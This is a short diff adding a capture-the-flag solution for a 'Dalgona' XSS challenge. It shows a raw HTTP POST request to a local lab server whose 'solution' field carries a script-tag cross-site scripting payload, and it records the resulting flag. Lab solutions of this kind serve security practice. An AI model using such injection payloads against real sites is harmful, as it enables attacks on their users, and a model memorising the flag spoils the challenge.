@@ -1,0 +1,8 @@
+# Dalgona CTF XSS8 - POST solution param with script tag triggers XSS, server returns flag{b74b5516-3dc3-491e-8680-a01ab52b756c}
+
+POST /page HTTP/1.1
+Host: 172.17.0.1:49851
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+
+solution=<script>alert('XSS')</script>
